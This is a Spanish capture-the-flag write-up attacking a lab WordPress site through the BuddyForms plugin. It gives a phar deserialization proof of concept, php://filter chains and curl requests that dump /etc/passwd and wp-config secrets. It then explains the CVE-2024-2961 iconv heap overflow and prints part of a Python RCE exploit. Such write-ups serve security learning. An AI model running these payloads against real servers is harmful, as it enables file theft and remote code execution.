<br><br><a data-tooltip-position="top" aria-label="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8" rel="noopener nofollow" class="external-link" href="https://medium.com/tenable-techblog/wordpress-buddyforms-plugin-unauthenticated-insecure-deserialization-cve-2023-26326-3becb5575ed8" target="_blank">articulo</a><br><br>Bueno esta vulnerabilidad cosniste en subir un archivo .phar malicioso mediante upload_image_from_url y luego llamarlo con el wrapper phar://<br>Pruebo primero a subir un gif para verificar que funciona el exploit; el codigo defectuoso se puede examinar en este <a data-tooltip-position="top" aria-label="https://github.com/BuddyForms/BuddyForms/blob/master/includes/functions.php#L1488" rel="noopener nofollow" class="external-link" href="https://github.com/BuddyForms/BuddyForms/blob/master/includes/functions.php#L1488" target="_blank">enlace</a>;<br>
A pesar de subirse el archivo en formato .png podemos observar que el gif funciona en la pagina por lo que podremos subir un archivo phar malicioso que el servidor interprete como GIF<br><img alt="Pasted image 20250202141748.png" src="machines/bigbang/imgs/pasted-image-20250202141748.png"><br>dado esto procedemos  construir un exploit php<br>&lt;?php  
  
class Evil{  
  public function __wakeup() : void {  
    die("Arbitrary Deserialization");  
  }  
}  
  
  
//create new Phar  
$phar = new Phar('evil.phar');  
$phar-&gt;startBuffering();  
$phar-&gt;addFromString('test.txt', 'text');  
$phar-&gt;setStub("GIF89a\n&lt;?php __HALT_COMPILER(); ?&gt;");  
  
// add object of any class as meta data  
$object = new Evil();  
$phar-&gt;setMetadata($object);  
$phar-&gt;stopBuffering();
<br>Lo convertimos  a phar:<br>php --define phar.readonly=0 evil.php
➜  CVE-2023-26326 strings evil.phar 
GIF89a
&lt;?php __HALT_COMPILER(); ?&gt;
O:4:"Evil":0:{}
test.txt
text
GBMB
<br>Gif89a son los magic bytes  que van a enganar a la funcion del buddyforms upload_image_from_url() de tal forma que podremos exfiltrar nuestro php disfrazado de gif;<br>Ahora lo subimos al endpoint vulnerable que admite PUT<br>
wp-admin/admin-ajax.php<br><img alt="Pasted image 20250131141905.png" src="machines/bigbang/imgs/pasted-image-20250131141905.png"><br>
El servidor nos devuelve una URL indicando donde se ha subido nuestro archivo malicioso; Comprobamos que se ha subido correctamente navegando a la URL<br>
http://blog.bigbang.htb/wp-content/uploads/2025/01/<br><img alt="Pasted image 20250131142115.png" src="machines/bigbang/imgs/pasted-image-20250131142115.png"><br>Bueno pues tenemos injecion exitosa de archivos . ahora a construir el payload;<br>Dado que continuo este writeup de nuevo dia he vuelto a subir el phar al servidor esta vez se guarda como 1-2.png dado que no puedo <br><img alt="Pasted image 20250202143150.png" src="machines/bigbang/imgs/pasted-image-20250202143150.png"><br><br><a data-tooltip-position="top" aria-label="https://github.com/ambionics/wrapwrap" rel="noopener nofollow" class="external-link" href="https://github.com/ambionics/wrapwrap" target="_blank">Git</a><br>Vamos a usar wrapwrap para disfrazar el /etc/password en un archivo GIF anadiendo el GIF89a Header:<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py -h
usage: wrapwrap.py [-h] [-o OUTPUT] [-p PADDING_CHARACTER] [-f] path prefix suffix nb_bytes

Generates a php://filter wrapper that adds a prefix and a suffix to the contents of a file.

Example:

    $ ./wrapwrap.py /etc/passwd '&lt;root&gt;&lt;test&gt;' '&lt;/test&gt;&lt;/root&gt;' 100
    [*] Dumping 108 bytes from /etc/passwd.
    [+] Wrote filter chain to chain.txt (size=88781).
    $ php -r 'echo file_get_contents(file_get_contents("chain.txt"));'
    &lt;root&gt;&lt;test&gt;root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:2:2:bin:/bin:/usr/&lt;/test&gt;&lt;/root&gt;

positional arguments:
  path                  Path to the file
  prefix                A string to write before the contents of the file
  suffix                A string to write after the contents of the file
  nb_bytes              Number of bytes to dump. It will be aligned with 9

options:
  -h, --help            show this help message and exit
  -o OUTPUT, --output OUTPUT
                        File to write the payload to. Defaults to chain.txt
  -p PADDING_CHARACTER, --padding-character PADDING_CHARACTER
                        Character to pad the prefix and suffix. Defaults to `M`.
  -f, --from-file       If set, prefix and suffix indicate files to load their value from,
                        instead of the value itself

<br>Modificamos la evil_url para utilizar la cadena generada por wrapwrap , luego sube el archivo a través del endpoint vulnerable. Este método evita la restricción de tipo de archivo engañando al servidor para que interprete el archivo como una imagen. Con este enfoque, podemos realizar lectura de archivos arbitrarios y filtrar el contenido del archivo subido, que se supone que es una "imagen".<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '/etc/passwd' 'GIF89a' '' 500000 
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1444).
(venv) ➜  wrapwrap git:(main) ✗ cat chain.txt 
───────┬──────────────────────────────────────────────────────────────────────────────────────
       │ File: chain.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────
   1   │ php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-
       │ 32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-
       │ 32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv
       │ .CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.i
       │ conv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF
       │ 7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_
       │ JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.i
       │ conv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775
       │ |convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.
       │ UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|co
       │ nvert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert
       │ .iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.b
       │ ase64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSI
       │ SO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|conv
       │ ert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.
       │ IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|con
       │ vert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=/etc/passwd
───────┴───────────────────────────────────────
<br>Ahora modificamos la evil_url para utilizar la cadena generada por wrapwrap , luego súbela a través del punto de entrada vulnerable. Esto evita la restricción de tipo de archivo al engañar al servidor para que interprete el archivo como una imagen. Con este método, podemos realizar con éxito la lectura de archivos arbitrarios, filtrando los contenidos del archivo subido (que se interpreta como una "imagen").<br>wrapwrap git:(main) ✗ export evil_url="$(cat chain.txt )" 

wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-4.png","attachment_id":159}%        

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-4.png' -o exploited.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   843  100   843    0     0   7500      0 --:--:-- --:--:-- --:--:--  7526
(venv) ➜  wrapwrap git:(main) ✗ strings exploited.png 
GIF89aroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologi

<br>Parece que estamos en un contenedor docker al no haber mas usuarios que root con el bash;<br>
vamos a intentar leer el wp-config con el mismo procedimiento:<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-config.php' 'GIF89a' '' 500000
[!] Ignoring nb_bytes value since there is no suffix
[+] Wrote filter chain to chain.txt (size=1449).
(venv) ➜  wrapwrap git:(main) ✗ export evil_url="$(cat chain.txt )"                     
(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-5.png","attachment_id":160}%  

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-5.png' -o wpconfig.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3348  100  3348    0     0  22633      0 --:--:-- --:--:-- --:--:-- 22775


(venv) ➜  wrapwrap git:(main) ✗ strings wpconfig.png 
GIF89a&lt;?php
 * The base configuration for WordPress
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 * This file contains the following configurations:
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 * @package WordPress
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wp_user' );
/** Database password */
define( 'DB_PASSWORD', 'wp_password' );
/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
 * Authentication unique keys and salts.
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 * @since 2.6.0
define( 'AUTH_KEY',         '(6xl?]9=.f9(&lt;(yxpm9]5&lt;wKsyEc+y&amp;MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK' );
define( 'SECURE_AUTH_KEY',  'F&lt;3&gt;KtCm^zs]Mxm Rr*N:&amp;{SWQexFn@ wnQ+bTN5UCF-&lt;gMsT[mH$m))T&gt;BqL}%8' );
define( 'LOGGED_IN_KEY',    ':{yhPsf}tZRfMAut2$Fcne/.@Vs&gt;uukS&amp;JB04 Yy3{`$`6p/Q=d^9=ZpkfP,o%l]' );
define( 'NONCE_KEY',        'sC(jyKu&gt;gY(,&amp;: KS#Jh7x?/CB.hy8!_QcJhPGf@3q&lt;-a,D#?!b}h8 ao;g[&lt;OW;' );
define( 'AUTH_SALT',        '_B&amp; tL]9I?ddS! 0^_,4M)B&gt;aHOl{}e2P(l3=!./]~v#U&gt;dtF7zR=~LnJtLgh&amp;KK' );
define( 'SECURE_AUTH_SALT', '&lt;Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te&lt;r^^Vh3KQ~B2c|~VvZ' );
define( 'LOGGED_IN_SALT',   '_zl+LT[GqIV{*Hpv&gt;]H:&lt;U5oO[w:]?%Dh(s&amp;Tb-2k`1!WFqKu;elq7t^~v7zS{n[' );
define( 'NONCE_SALT',       't2~PvIO1qeCEa^+J}@h&amp;x&lt;%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ' );
/**#@-*/
 * WordPress database table prefix.
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
$table_prefix = 'wp_';
 * For developers: WordPress debugging mode.
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
define( 'WP_DEBUG', false );
/* Add any custom values between this line and the "stop editing" line. */
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';


<br>Confirmamos que es un container dado que la base de datos se encuentra alojada en la 172.17.0.1 que es un rango IP que usa docker por defecto; vamos a sacar el wp-settings.php<br>(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-settings.php' 'GIF89a' '' 500000
[+] Wrote filter chain to chain.txt (size=1451).

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-d "action=upload_image_from_url&amp;id=1&amp;accepted_files=image/gif&amp;url=${evil_url}"

{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/02\/1-6.png","attachment_id":161}%  

(venv) ➜  wrapwrap git:(main) ✗ curl 'http://blog.bigbang.htb//wp-content//uploads//2025//02//1-5.png' -o wpsettings.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3348  100  3348    0     0   1592      0  0:00:02  0:00:02 --:--:--  1592
(venv) ➜  wrapwrap git:(main) ✗ python3 wrapwrap.py '../wp-settings.php' 'GIF89a' '' 500000
(venv) ➜  wrapwrap git:(main) ✗ strings wpsettings.png 

GIF89a&lt;?php
 * The base configuration for WordPress
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 * This file contains the following configurations:
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 * @package WordPress
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** Database username */
define( 'DB_USER', 'wp_user' );
/** Database password */
define( 'DB_PASSWORD', 'wp_password' );
/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
/**#@+
 * Authentication unique keys and salts.
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 * @since 2.6.0
define( 'AUTH_KEY',         '(6xl?]9=.f9(&lt;(yxpm9]5&lt;wKsyEc+y&amp;MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK' );
define( 'SECURE_AUTH_KEY',  'F&lt;3&gt;KtCm^zs]Mxm Rr*N:&amp;{SWQexFn@ wnQ+bTN5UCF-&lt;gMsT[mH$m))T&gt;BqL}%8' );
define( 'LOGGED_IN_KEY',    ':{yhPsf}tZRfMAut2$Fcne/.@Vs&gt;uukS&amp;JB04 Yy3{`$`6p/Q=d^9=ZpkfP,o%l]' );
define( 'NONCE_KEY',        'sC(jyKu&gt;gY(,&amp;: KS#Jh7x?/CB.hy8!_QcJhPGf@3q&lt;-a,D#?!b}h8 ao;g[&lt;OW;' );
define( 'AUTH_SALT',        '_B&amp; tL]9I?ddS! 0^_,4M)B&gt;aHOl{}e2P(l3=!./]~v#U&gt;dtF7zR=~LnJtLgh&amp;KK' );
define( 'SECURE_AUTH_SALT', '&lt;Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te&lt;r^^Vh3KQ~B2c|~VvZ' );
define( 'LOGGED_IN_SALT',   '_zl+LT[GqIV{*Hpv&gt;]H:&lt;U5oO[w:]?%Dh(s&amp;Tb-2k`1!WFqKu;elq7t^~v7zS{n[' );
define( 'NONCE_SALT',       't2~PvIO1qeCEa^+J}@h&amp;x&lt;%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ' );
/**#@-*/
 * WordPress database table prefix.
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
$table_prefix = 'wp_';
 * For developers: WordPress debugging mode.
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
define( 'WP_DEBUG', false );
/* Add any custom values between this line and the "stop editing" line. */
/* That's all, stop editing! Happy publishing. */
/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
<br>CVE-2024–2961 | Buffer Overflow<br>Vamos a explotar la  vulnerabilidad CVE-2024–2961 , un buffer overflow presente en la biblioteca GNU libiconv. Esta vulnerabilidad permite ejecución remota de código (RCE) debido a una mala validación de entrada durante la conversión entre conjuntos de caracteres. Aunque el exploit es complejo y requiere conocimientos avanzados de explotación binaria, intentaremos desglosarlo paso a paso para facilitar su comprensión.<br>La vulnerabilidad fue descubierta en el contexto del plugin BuddyForms de WordPress, lo que la hace especialmente relevante para ataques web. Vamos a analizar cómo funciona esta vulnerabilidad desde una perspectiva técnica, centrándonos en los conceptos clave necesarios para su explotación.<br><br><br>libiconv es una biblioteca utilizada para convertir texto entre diferentes conjuntos de caracteres (charset). En PHP, muchas funciones de manipulación de cadenas dependen de esta biblioteca, especialmente cuando se usa la función iconv(). La vulnerabilidad radica en cómo libiconv maneja ciertos caracteres exóticos en el conjunto de caracteres ISO-2022-CN-EXT .<br><br>El conjunto de caracteres ISO-2022-CN-EXT utiliza secuencias de escape (ESC bytes, como \x1B) para cambiar dinámicamente entre diferentes codificaciones de caracteres. Cada carácter puede requerir hasta 4 bytes :<br>
<br>2 bytes para la secuencia de escape.
<br>2 bytes para el carácter codificado.
<br>Por ejemplo:<br>
<br>El carácter 劄 podría ser codificado como ESC $ * H (en formato hexadecimal: \x1B\x24\x2A\x48).
<br>Cuando libiconv procesa estos caracteres, debe escribir 4 bytes en el búfer de salida. Sin embargo, falta una verificación adecuada del tamaño del búfer , lo que puede provocar un desbordamiento de búfer si no hay suficiente espacio disponible.<br><br>Antes de profundizar en la explotación, es importante entender cómo funciona el manejo de memoria en PHP:<br><br>PHP utiliza funciones como emalloc(N) para asignar bloques de memoria de tamaño N y devuelve un puntero a esa memoria. Cuando un bloque ya no es necesario, se libera con efree(ptr).<br><br>El montón de PHP está dividido en regiones de 2MB , subdivididas en páginas de 4KB (0x1000 bytes) . Cada página almacena bloques (chunks) de un tamaño específico:<br>
<br>Página 10: Bloques de 0x100 bytes .
<br>Página 11: Bloques de 0x38 bytes .
<br>Y así sucesivamente...
<br>No hay metadatos entre bloques para rastrear asignaciones, lo que lo hace eficiente pero vulnerable a desbordamientos, ya que no hay verificaciones de seguridad entre bloques en el montón.<br><br>Los bloques liberados se añaden a listas libres (free lists), que son listas enlazadas simples (inseguras comparadas con listas doblemente enlazadas). Cuando se llama a efree(ptr), el bloque se agrega al inicio de la lista libre (comportamiento LIFO).<br>Si ocurre un desbordamiento en un bloque adyacente, se puede sobrescribir el puntero almacenado en el primer byte del bloque libre, alterando la estructura de la lista libre. Esto permite controlar dónde se asignará el siguiente bloque, lo que es crítico para la explotación.<br><br><br>El protocolo php://filter es ampliamente utilizado para aplicar filtros a recursos locales o remotos. Vamos a entender cómo PHP maneja este mecanismo:<br><br>Cuando PHP lee un recurso (por ejemplo, /etc/passwd), lo carga en un flujo representado por una brigada de cubetas (bucket brigade) :<br>
<br>Una brigada de cubetas es una lista enlazada doble de cubetas, donde cada cubeta contiene un búfer con una parte de los datos del recurso.
<br>Ejemplo: /etc/passwd podría estar dividido en:

<br>Cubeta 1: Primeros 5 bytes.
<br>Cubeta 2: Siguientes 30 bytes.
<br>Cubeta 3: Siguientes 1000 bytes.


<br><br>Los filtros (como string.upper) se aplican a las cubetas uno por uno:<br>
<br>PHP procesa cada cubeta, asignando un búfer de salida del mismo tamaño que el búfer de entrada.
<br>Por ejemplo, si el filtro es string.upper, los caracteres minúsculos en el búfer de entrada se convierten a mayúsculas en el búfer de salida.
<br>Se crea una nueva cubeta para los datos procesados.
<br><br>Una vez que se procesa una cubeta con un filtro, se crea una nueva brigada de cubetas con los resultados. El siguiente filtro se aplica a esta nueva brigada. Este proceso continúa hasta que todos los filtros se han aplicado.<br>Este mecanismo introduce potenciales vulnerabilidades:<br>
<br>Los filtros procesan datos en bloques, lo que los hace susceptibles a desbordamientos de búfer si las verificaciones de tamaño son insuficientes.
<br>Las cadenas de filtros aumentan la complejidad, permitiendo a los atacantes crear payloads intrincados.
<br><br><br>Nuestro objetivo es aprovechar la vulnerabilidad de desbordamiento de búfer en el filtro convert.iconv.XXX.ISO-2022-CN-EXT para lograr ejecución remota de código (RCE).<br><br>Con la explotación anterior, obtenemos la capacidad de leer archivos arbitrarios. Esto nos permite:<br>
<br>Leer binaries críticos como PHP, Apache y bibliotecas compartidas (ejemplo: libc) para análisis.
<br>Filtrar la distribución de memoria (/proc/self/maps) para revelar la disposición de la memoria del proceso en ejecución. Esto evita ASLR (Randomización del Espacio de Direcciones) y PIE (Ejecutables Independientes de Posición).
<br><br>A través del abuso de las cubetas, podemos asignar y liberar búferes casi arbitrariamente:<br>
<br>Usar zlib.inflate para crear múltiples cubetas.
<br>Redimensionar las cubetas con dechunk para alinearlas con los tamaños de bloques en el montón (por ejemplo, 0x100).
<br>Manipular la lista libre mediante la asignación, liberación y sobrescritura de punteros.
<br><br>Esta técnica permite manipular las cubetas de manera precisa para preparar la explotación (pon que las cubetas son muñequitas rusas ):<br>
<br>Lograr control total sobre qué escribir y dónde (write-what-where).
<br>Ejecutar comandos arbitrarios.
<br><br><br>
<br>
Solicitud 1 : Leer /proc/self/maps para filtrar:

<br>La disposición de memoria del proceso PHP (incluyendo la dirección del montón).
<br>La dirección base de libc para usar técnicas ROP.


<br>
Solicitud 2 : Descargar la versión coincidente de libc para extraer la dirección de la función system() y habilitar la ejecución de comandos arbitrarios con system('/bin/sh').

<br>
Solicitud 3 : Ejecutar el payload final:

<br>Desencadenar el desbordamiento.
<br>Manipular el montón.
<br>Ejecutar el comando.


<br><br><br>
<br>Implementa métodos para enviar solicitudes HTTP POST al endpoint vulnerable.
<br>Usa la cadena de filtros chain_prefix (los que usamos con wrapwrap) para engañar al sistema en la interpretación de datos.
<br>Permite descargar archivos remotos utilizando técnicas como php://filter.
<br>
<br>
check_vulnerable:

<br>Comprueba si los wrappers data://, php://filter y la extensión zlib están habilitados.
<br>Si alguno de estos no está disponible, el exploit no funcionará.


<br>
get_symbols_and_addresses:

<br>Lee el archivo /proc/self/maps para obtener las regiones de memoria del proceso PHP.
<br>Busca la dirección base de libc y el montón (heap) en la memoria.
<br>Descarga una copia local de libc.so.6 para analizar símbolos y direcciones específicas.


<br>
build_exploit_path:

<br>Construye el payload malicioso que explotará la vulnerabilidad.
<br>

<br>Creación de bloques (buckets) personalizados.
<br>Manipulación del heap mediante técnicas como dechunk y convert.iconv.
<br>Sobrescritura del puntero free_slot para controlar la asignación de memoria.




<br>
exploit:

<br>Envía el payload final al servidor objetivo.
<br>Espera un tiempo configurado (sleep) para verificar si el exploit fue exitoso.


<br><br>La clase Exploit es la parte principal del script. Contiene toda la lógica necesaria para construir y enviar el payload malicioso.<br><br>
<br>
check_vulnerable:

<br>Verifica si el sistema objetivo es vulnerable.
<br>Comprueba si los wrappers data://, php://filter y la extensión zlib están habilitados.
<br>Si alguno de estos no está disponible, el exploit no funcionará.


<br>
get_symbols_and_addresses:

<br>Lee el archivo /proc/self/maps para obtener las regiones de memoria del proceso PHP.
<br>Busca la dirección base de libc y el montón (heap) en la memoria.
<br>Descarga una copia local de libc.so.6 para analizar símbolos y direcciones específicas.


<br>
build_exploit_path:

<br>Construye el payload malicioso que explotará la vulnerabilidad.
<br>Utiliza técnicas avanzadas como:

<br>Creación de bloques (buckets) personalizados.
<br>Manipulación del montón mediante técnicas como dechunk y convert.iconv.
<br>Sobrescritura del puntero free_slot para controlar la asignación de memoria.




<br>
exploit:

<br>Envía el payload final al servidor objetivo.
<br>Espera un tiempo configurado (sleep) para verificar si el exploit fue exitoso.


<br>
from __future__ import annotations

import base64
import urllib.parse
import zlib
import urllib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:

    def __init__(self, url: str) -&gt; None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -&gt; Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """

        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus('php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource='+path),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)


    def send_exploit(self, payload: bytes) -&gt; Response:
        """Sends the payload to the server.
        """
        data = {'action' : 'upload_image_from_url',
                'url' : urllib.parse.quote_plus(payload),
                'id' : '1',
                'accepted_files' : 'image/gif'}
        return self.session.post(self.url, data=data)
        
    def download(self, path: str) -&gt; bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        file_path = self.send(path).json()['response']
        
        if 'File type' in file_path:
            print(file_path)
            return b''
        
        response = self.session.get(file_path)
        data = response.content[6:]
        return data

    def data_decode(self, data:bytes)-&gt;bytes:
        data = data.decode('latin-1')
        return base64.decode(data + (4 - len(data) % 4) * '=')

@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -&gt; None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """
        
        def safe_download(path: str) -&gt; bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")
            

        def check_token(text: str, path: str) -&gt; bool:
            result = safe_download(path)

            return len(set(result).intersection(set(text.encode()))) &gt; 0

        text = tf.random.string(50).encode()
        base64 = b64(b'GIF89a' + text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"
        
        result = safe_download(path)
        
        if len(set(result).intersection(set(text))) == 0:
